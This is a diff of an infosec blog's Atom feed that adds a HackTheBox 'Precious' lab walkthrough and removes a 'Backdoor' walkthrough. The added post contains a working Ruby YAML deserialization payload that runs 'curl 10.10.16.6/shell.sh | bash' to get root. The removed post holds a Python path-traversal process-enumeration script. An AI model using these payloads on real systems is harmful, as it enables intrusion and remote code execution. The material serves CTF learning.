@@ -1,4 +1,186 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-03-23T16:57:45+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A blog for infosec stuff.</subtitle><entry><title type="html">Cyber Apocalypse 2023 - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/cyberapoc_23.html" rel="alternate" type="text/html" title="Cyber Apocalypse 2023 - HackTheBox" /><published>2023-03-23T00:00:00+01:00</published><updated>2023-03-23T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/cyberapoc_23</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/cyberapoc_23.html"><![CDATA[<p><strong>Cyber Apocalypse 2023</strong> is a very nice jeopardy-style CTF competition hosted by <em>HackTheBox</em>. It was a 5-day CTF played between 19th - 23rd March, 2023. This is a write-up on some of the challenges that I managed to solve during the competition.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-05-20T18:32:41+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A blog for infosec stuff.</subtitle><entry><title type="html">Precious - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/precious.html" rel="alternate" type="text/html" title="Precious - HackTheBox" /><published>2023-05-20T00:00:00+01:00</published><updated>2023-05-20T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/precious</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/precious.html"><![CDATA[<p><strong>Precious</strong> is a very easy linux machine on <em>HackTheBox</em>. It starts with exploiting a web application that generates a PDF file based on the output of a URL. Lateral movement to a local user involves finding a password in a configuration file, and a custom <em>YAML deserialization</em> exploit to elevate to <em>root</em>.</p>
+
+<p><br /></p>
+
+<h3 id="about">About</h3>
+<p><br /></p>
+
+<p><img src="/assets/img/Pasted image 20230325061650.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230325061731.png" alt="" /></p>
+
+<hr />
+<p><br /></p>
+
+<h3 id="recon">Recon</h3>
+<p><br /></p>
+
+<h4 id="nmap">NMAP</h4>
+<p><br /></p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="rouge-code"><pre># Nmap 7.70 scan initiated Wed Mar 15 07:29:11 2023 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.189
+Nmap scan report for 10.10.11.189
+Host is up (0.46s latency).
+Not shown: 992 closed ports
+PORT      STATE    SERVICE           VERSION
+22/tcp    open     ssh               OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+80/tcp    open     http              nginx 1.18.0
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: nginx/1.18.0
+|_http-title: Did not follow redirect to http://precious.htb/
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Mar 15 07:30:57 2023 -- 1 IP address (1 host up) scanned in 106.44 seconds
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="web">Web</h4>
+<p><br /></p>
+
+<p>Site is a <em>web page to PDF converter</em>;</p>
+
+<p><img src="/assets/img/Pasted image 20230325062726.png" alt="" /></p>
+
+<p>Giving it the URL to a web server running on my host, I got a request, and a PDF download was initiated with the contents of the web page;</p>
+
+<p><img src="/assets/img/Pasted image 20230325063224.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230325063056.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230325071135.png" alt="" /></p>
+
+<p>Attempts to use the <code class="language-plaintext highlighter-rouge">file://</code> protocol to read local files kept failing. Using <code class="language-plaintext highlighter-rouge">netcat</code> to capture the request headers, the <em>user agent</em> looks interesting;</p>
+
+<p><img src="/assets/img/Pasted image 20230325063510.png" alt="" /></p>
+
+<p><strong>wkhtmltopdf</strong> is a utility for converting HTML pages to PDF. My searches for exploits lead me to <a href="http://hassankhanyusufzai.com/SSRF-to-LFI/">this article</a>, but had no luck with it on the box. Looking at the metadata of the generated PDF file;</p>
+
+<p><img src="/assets/img/Pasted image 20230325063817.png" alt="" /></p>
+
+<p>Looking for vulnerabilities lead me to <a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795">CVE-2022-25765</a>;</p>
+
+<p><img src="/assets/img/Pasted image 20230325064748.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230325064812.png" alt="" /></p>
+
+<p>I used it to spawn a reverse shell on the box as <em>ruby</em>;</p>
+
+<p><img src="/assets/img/Pasted image 20230325065000.png" alt="" /></p>
+
+<hr />
+<p><br /></p>
+
+<h3 id="user">User</h3>
+<p><br /></p>
+
+<p><em>Ruby</em> does not have <code class="language-plaintext highlighter-rouge">user.txt</code>. Another user in the box exists with the name <em>henry</em>. Looking into <em>ruby’s</em> home directory, the creds of <em>henry</em> were found in <code class="language-plaintext highlighter-rouge">/home/ruby/.bundle/config</code>;</p>
+
+<p><img src="/assets/img/Pasted image 20230325065343.png" alt="" /></p>
+
+<p>Using this password, I was able to login to the box as <em>henry</em> over SSH;</p>
+
+<p><img src="/assets/img/Pasted image 20230325065455.png" alt="" /></p>
+
+<hr />
+<p><br /></p>
+
+<h3 id="privesc">PrivEsc</h3>
+<p><br /></p>
+
+<p><em>henry</em> is not in any special group. Checking <code class="language-plaintext highlighter-rouge">sudo</code> perms showed he can run a custom script;</p>
+
+<p><img src="/assets/img/Pasted image 20230325065608.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230325065910.png" alt="" /></p>
+
+<p>Notice that at line <strong>10</strong>, the program is loading a <em>YAML</em> file using relative path, which means we could be able to control the file being read. Using the guide in <a href="https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/">this post</a>, I was able to get code execution as <code class="language-plaintext highlighter-rouge">root</code> using the following payload;</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre></td><td class="rouge-code"><pre><span class="nn">---</span>
+ <span class="pi">-</span> <span class="kt">!ruby/object:Gem::Installer</span>
+     <span class="na">i</span><span class="pi">:</span> <span class="s">x</span>
+ <span class="pi">-</span> <span class="kt">!ruby/object:Gem::SpecFetcher</span>
+     <span class="na">i</span><span class="pi">:</span> <span class="s">y</span>
+ <span class="pi">-</span> <span class="kt">!ruby/object:Gem::Requirement</span>
+   <span class="na">requirements</span><span class="pi">:</span>
+     <span class="kt">!ruby/object:Gem::Package::TarReader</span>
+     <span class="na">io</span><span class="pi">:</span> <span class="nl">&amp;1</span> <span class="kt">!ruby/object:Net::BufferedIO</span>
+       <span class="na">io</span><span class="pi">:</span> <span class="nl">&amp;1</span> <span class="kt">!ruby/object:Gem::Package::TarReader::Entry</span>
+          <span class="na">read</span><span class="pi">:</span> <span class="m">0</span>
+          <span class="na">header</span><span class="pi">:</span> <span class="s2">"</span><span class="s">abc"</span>
+       <span class="na">debug_output</span><span class="pi">:</span> <span class="nl">&amp;1</span> <span class="kt">!ruby/object:Net::WriteAdapter</span>
+          <span class="na">socket</span><span class="pi">:</span> <span class="nl">&amp;1</span> <span class="kt">!ruby/object:Gem::RequestSet</span>
+              <span class="na">sets</span><span class="pi">:</span> <span class="kt">!ruby/object:Net::WriteAdapter</span>
+                  <span class="na">socket</span><span class="pi">:</span> <span class="kt">!ruby/module</span> <span class="s1">'</span><span class="s">Kernel'</span>
+                  <span class="na">method_id</span><span class="pi">:</span> <span class="s">:system</span>
+              <span class="na">git_set</span><span class="pi">:</span> <span class="s">curl 10.10.16.6/shell.sh | bash</span>
+          <span class="na">method_id</span><span class="pi">:</span> <span class="s">:resolve</span> 
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/assets/img/Pasted image 20230325070521.png" alt="" /></p>
+
+<hr />
+<p><br /></p>
+
+<h3 id="summary">Summary</h3>
+<p><br /></p>
+
+<ul>
+  <li>NMAP identified a web server.</li>
+  <li>Site is used for converting web pages from a URL to a PDF
+    <ul>
+      <li>Uses <em>pdfkit v0.8.6</em>, which is vulnerable to <strong>CVE-2022-25765</strong></li>
+      <li>Gained code execution as <em>ruby</em></li>
+    </ul>
+  </li>
+  <li><em>ruby</em>;
+    <ul>
+      <li>Found the creds of <em>henry</em> at <code class="language-plaintext highlighter-rouge">/home/ruby/.bundle/config</code></li>
+    </ul>
+  </li>
+  <li><em>henry</em>
+    <ul>
+      <li>Has <code class="language-plaintext highlighter-rouge">sudo</code> perms on a custom script that loads <code class="language-plaintext highlighter-rouge">dependencies.yml</code> using relative path.</li>
+      <li>Exploited <em>YAML</em> deserialization to get code execution as <code class="language-plaintext highlighter-rouge">root</code></li>
+    </ul>
+  </li>
+</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="easy" /><category term="linux" /><category term="web" /><category term="pdfkit" /><category term="wkhtmltopdf" /><category term="ruby" /><category term="deserialization" /><category term="yaml" /><category term="yaml deserialization" /><summary type="html"><![CDATA[Precious is a very easy linux machine on HackTheBox. It starts with exploiting a web application that generates a PDF file based on the output of a URL. Lateral movement to a local user involves finding a password in a configuration file, and a custom YAML deserialization exploit to elevate to root.]]></summary></entry><entry><title type="html">Cyber Apocalypse 2023 - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/cyberapoc_23.html" rel="alternate" type="text/html" title="Cyber Apocalypse 2023 - HackTheBox" /><published>2023-03-23T00:00:00+01:00</published><updated>2023-03-23T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/cyberapoc_23</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/cyberapoc_23.html"><![CDATA[<p><strong>Cyber Apocalypse 2023</strong> is a very nice jeopardy-style CTF competition hosted by <em>HackTheBox</em>. It was a 5-day CTF played between 19th - 23rd March, 2023. This is a write-up on some of the challenges that I managed to solve during the competition.</p>
 
 <p><br /></p>
 
@@ -3965,248 +4147,4 @@ Service detection performed. Please report any incorrect results at https://nmap
       <li>Exploited it to gain code execution as <em>root</em>.</li>
     </ul>
   </li>
-</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="snmp" /><category term="vhost" /><category term="apache" /><category term="php" /><category term="static analysis" /><category term="lfi" /><category term="suid" /><category term="reverse engineering" /><category term="path tampering" /><category term="radare2" /><summary type="html"><![CDATA[Pandora is an easy linux box. It starts with a website, which you don’t really need because foothold involves enumerating an SNMP service on port 161 (UDP) for running processes, which will give you the credentials of a local user. This will give you SSH access to the box, which you will use to setup a tunnel to an apache vhost that’s accessible only locally. This site is vulnerable to LFI ( I later found out this is unintended, and never got around to actually doing the box the intended way :p ) which you can use to move to another local user, and from there exploit a custom SUID binary through path tampering to gain code execution as root.]]></summary></entry><entry><title type="html">Backdoor - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/backdoor.html" rel="alternate" type="text/html" title="Backdoor - HackTheBox" /><published>2022-04-23T00:00:00+01:00</published><updated>2022-04-23T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/backdoor</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/backdoor.html"><![CDATA[<p><strong>Backdoor</strong> is a very easy linux box on <em>HackTheBox</em>. It starts with a web service running <em>wordpress</em> with a plugin that’s vulnerable to <em>path traversal</em>, which you can use to read arbitrary files on the box. You then use this bug to identify a service running on the box on port <strong>1337</strong>, which you can exploit to gain a foothold on the box as the local user. Privesc is stupidly easy, and targets a <em>screen</em> session running on the box as root.</p>
-
-<p><br /></p>
-
-<h3 id="about">About</h3>
-<p><br /></p>
-
-<p><img src="/assets/img/20220421094330.png" alt="" /></p>
-
-<p><img src="/assets/img/20220421094356.png" alt="" /></p>
-
-<p><br /></p>
-
-<hr />
-<h3 id="recon">Recon</h3>
-<p><br /></p>
-
-<h4 id="nmap">NMAP</h4>
-
-<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-</pre></td><td class="rouge-code"><pre># Nmap 7.70 scan initiated Sat Nov 20 20:00:32 2021 as: nmap -sC -sV -oN nmap.txt -v backdoor.htb
-Nmap scan report for backdoor.htb (10.10.11.125)
-Host is up (0.28s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-|_http-generator: WordPress 5.8.1
-| http-methods: 
-|_  Supported Methods: GET HEAD POST OPTIONS
-|_http-server-header: Apache/2.4.41 (Ubuntu)
-|_http-title: Backdoor &amp;#8211; Real-Life
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Read data files from: /usr/bin/../share/nmap
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Sat Nov 20 20:01:23 2021 -- 1 IP address (1 host up) scanned in 51.47 seconds
-</pre></td></tr></tbody></table></code></pre></div></div>
-
-<p><br /></p>
-
-<h4 id="web">Web</h4>
-
-<p><em>Wappalyzer</em> identified it as a wordpress site;</p>
-
-<p><img src="/assets/img/20220421094748.png" alt="" /></p>
-
-<p>Oddly, the default wordpress plugins directory on the site shows the index of the directory, saving us the need to enumerate plugins;</p>
-
-<p><img src="/assets/img/20220421095240.png" alt="" /></p>
-
-<p>A search on <em>exploitdb</em> using <code class="language-plaintext highlighter-rouge">searchsploit</code> showed this plugin has a vulnerability;</p>
-
-<p><img src="/assets/img/20220421095544.png" alt="" /></p>
-
-<p><img src="/assets/img/20220421095623.png" alt="" /></p>
-
-<p>Using the PoC, I was able to view the file <code class="language-plaintext highlighter-rouge">/etc/hosts</code> on the box;</p>
-
-<p><img src="/assets/img/20220421100027.png" alt="" /></p>
-
-<p><br /></p>
-
-<hr />
-<h3 id="foothold">Foothold</h3>
-<p><br /></p>
-
-<p>Using the <em>file traversal</em> bug, a credential was recovered from the wordpress config file <code class="language-plaintext highlighter-rouge">wp-config.php</code>;</p>
-
-<p><img src="/assets/img/20220421100210.png" alt="" /></p>
-
-<p>I was unable to login to the admin dashboard using the credential. Trying the password for the user <strong>user</strong> over SSH also didn’t work;</p>
-
-<p><img src="/assets/img/20220421100541.png" alt="" /></p>
-
-<p>I spent some time working with the <em>file traversal</em> bug, but couldn’t find anything of much interest. A full <code class="language-plaintext highlighter-rouge">nmap</code> scan on the host showed port <strong>1337</strong> is open, but could not be identified;</p>
-
-<p><img src="/assets/img/20220421101609.png" alt="" /></p>
-
-<p>Using the <em>file traversal</em> bug, I wrote a simple program to enumerate running processes by burteforcing <code class="language-plaintext highlighter-rouge">/proc/&lt;pid&gt;/cmdline</code> in hope of finding the process;</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-36
-37
-38
-39
-40
-41
-42
-43
-44
-</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
-#------------------------------------------------------------------------------
-#   A program for bruteforcing running processes on Backdoor (HackTheBox) using
-# the path traversal bug in a wordpress plugin.
-#                                                               Author: 4g3nt47
-#------------------------------------------------------------------------------
-</span>
-<span class="kn">import</span> <span class="nn">queue</span>
-<span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">import</span> <span class="nn">threading</span>
-<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
-
-<span class="n">abort</span> <span class="o">=</span> <span class="bp">False</span>
-<span class="n">threads</span> <span class="o">=</span> <span class="mi">10</span>
-<span class="n">pids</span> <span class="o">=</span> <span class="n">queue</span><span class="p">.</span><span class="n">Queue</span><span class="p">()</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1000</span><span class="p">):</span>
-  <span class="n">pids</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
-
-<span class="k">def</span> <span class="nf">brute</span><span class="p">():</span>
-  <span class="k">while</span> <span class="n">pids</span><span class="p">.</span><span class="n">empty</span><span class="p">()</span> <span class="o">==</span> <span class="bp">False</span> <span class="ow">and</span> <span class="n">abort</span> <span class="o">!=</span> <span class="bp">True</span><span class="p">:</span>
-    <span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="s">"http"</span><span class="p">:</span><span class="s">"http://localhost:8080"</span><span class="p">}</span>
-    <span class="n">pid</span> <span class="o">=</span> <span class="n">pids</span><span class="p">.</span><span class="n">get</span><span class="p">()</span>
-    <span class="n">url</span> <span class="o">=</span> <span class="s">"http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/%d/cmdline"</span> <span class="o">%</span><span class="p">(</span><span class="n">pid</span><span class="p">)</span>
-    <span class="k">try</span><span class="p">:</span>
-      <span class="n">content</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">).</span><span class="n">content</span><span class="p">.</span><span class="n">decode</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
-      <span class="n">invalid</span> <span class="o">=</span> <span class="s">"/proc/%d/cmdline"</span> <span class="o">%</span><span class="p">(</span><span class="n">pid</span><span class="p">)</span>
-      <span class="n">invalid</span> <span class="o">=</span> <span class="n">invalid</span> <span class="o">+</span> <span class="n">invalid</span> <span class="o">+</span> <span class="n">invalid</span> <span class="o">+</span> <span class="s">"&lt;script&gt;window.close()&lt;/script&gt;"</span>
-      <span class="k">if</span> <span class="n">content</span> <span class="ow">and</span> <span class="n">content</span> <span class="o">!=</span> <span class="n">invalid</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="s">"%d : %s"</span> <span class="o">%</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">content</span><span class="p">))</span>
-    <span class="k">except</span><span class="p">:</span>
-      <span class="k">continue</span>
-
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">threads</span><span class="p">):</span>
-  <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">brute</span><span class="p">)</span>
-  <span class="n">t</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
-
-<span class="k">while</span> <span class="n">pids</span><span class="p">.</span><span class="n">empty</span><span class="p">()</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
-  <span class="k">try</span><span class="p">:</span>
-    <span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">"[*] PIDs left: %d"</span> <span class="o">%</span><span class="p">(</span><span class="n">pids</span><span class="p">.</span><span class="n">qsize</span><span class="p">()))</span>
-  <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
-    <span class="n">abort</span> <span class="o">=</span> <span class="bp">True</span>
-    <span class="k">break</span>
-
-</pre></td></tr></tbody></table></code></pre></div></div>
-
-<p>Running the program, I found one process that stood out;</p>
-
-<p><img src="/assets/img/20220421102547.png" alt="" /></p>
-
-<p><em>GDB Server</em> is used for remotely debugging programs on a system, which makes it an interesting target for RCE. There is an exploit for this service in <em>metasploit</em>;</p>
-
-<p><img src="/assets/img/20220421103158.png" alt="" /></p>
-
-<p><img src="/assets/img/20220421103612.png" alt="" /></p>
-
-<p>Running the exploit, I got a shell on the box as the user <code class="language-plaintext highlighter-rouge">user</code>;</p>
-
-<p><img src="/assets/img/20220421103755.png" alt="" /></p>
-
-<p>I don’t like working in <em>meterpreter</em> shell, so I switched to a bash reverse shell with tty;</p>
-
-<p><img src="/assets/img/20220421104330.png" alt="" /></p>
-
-<p><br /></p>
-
-<hr />
-<h3 id="privesc">PrivEsc</h3>
-<p><br /></p>
-
-<p>The user is not part of any interesting groups, and I can’t view sudo permissions because I do not have their password.</p>
-
-<p>Going through running processes on the box using <code class="language-plaintext highlighter-rouge">ps</code> and <code class="language-plaintext highlighter-rouge">htop</code>, I found something;</p>
-
-<p><img src="/assets/img/20220421104808.png" alt="" /></p>
-
-<p><code class="language-plaintext highlighter-rouge">screen</code> is a terminal multiplexer, and the above command is running it as the root user. If I can attach to this session, I would be able to easily run commands as root. The interesting portion of the command is <code class="language-plaintext highlighter-rouge">screen -dmS root</code>. Going through the help page of <code class="language-plaintext highlighter-rouge">screen</code>, I learned that it basically creates a screen session in detached mode with the name <code class="language-plaintext highlighter-rouge">root</code>.</p>
-
-<p>The <code class="language-plaintext highlighter-rouge">screen</code> program accepts the <code class="language-plaintext highlighter-rouge">-x</code> flag, which can be used to attach to a given session owned by a given user. Using the command <code class="language-plaintext highlighter-rouge">screen -x root/root</code>, I was able to attach to the screen session created by root;</p>
-
-<p><img src="/assets/img/20220421105356.png" alt="" /></p>
-
-<p><br /></p>
-
-<hr />
-<h3 id="summary">Summary</h3>
-<p><br /></p>
-
-<ul>
-  <li>Identified port <strong>22</strong> and <strong>80</strong> using <code class="language-plaintext highlighter-rouge">nmap</code></li>
-  <li>Port <strong>80</strong> is running wordpress with a vulnerable plugin (Path Traversal)</li>
-  <li>Full port scan showed port <strong>1337</strong> is open</li>
-  <li>Used the <em>path traversal</em> bug to identify the service on port <strong>1337</strong> (gdbserver)
-    <ul>
-      <li>Used <code class="language-plaintext highlighter-rouge">exploit/multi/gdb/gdb_server_exec</code> in metasploit to gain code execution on the box as the user <strong>user</strong></li>
-    </ul>
-  </li>
-  <li>Inside the box as <strong>user</strong>;
-    <ul>
-      <li><code class="language-plaintext highlighter-rouge">htop</code> showed a screen session running as the user <strong>root</strong></li>
-      <li>Attached to the session using <code class="language-plaintext highlighter-rouge">screen -x root/root</code> to gain a shell as <strong>root</strong></li>
-    </ul>
-  </li>
-</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="easy" /><category term="web" /><category term="wordpress" /><category term="path traversal" /><category term="lfi" /><category term="cve" /><category term="metasploit" /><category term="gdbserver" /><category term="screen" /><summary type="html"><![CDATA[Backdoor is a very easy linux box on HackTheBox. It starts with a web service running wordpress with a plugin that’s vulnerable to path traversal, which you can use to read arbitrary files on the box. You then use this bug to identify a service running on the box on port 1337, which you can exploit to gain a foothold on the box as the local user. Privesc is stupidly easy, and targets a screen session running on the box as root.]]></summary></entry></feed>
+</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="snmp" /><category term="vhost" /><category term="apache" /><category term="php" /><category term="static analysis" /><category term="lfi" /><category term="suid" /><category term="reverse engineering" /><category term="path tampering" /><category term="radare2" /><summary type="html"><![CDATA[Pandora is an easy linux box. It starts with a website, which you don’t really need because foothold involves enumerating an SNMP service on port 161 (UDP) for running processes, which will give you the credentials of a local user. This will give you SSH access to the box, which you will use to setup a tunnel to an apache vhost that’s accessible only locally. This site is vulnerable to LFI ( I later found out this is unintended, and never got around to actually doing the box the intended way :p ) which you can use to move to another local user, and from there exploit a custom SUID binary through path tampering to gain code execution as root.]]></summary></entry></feed>
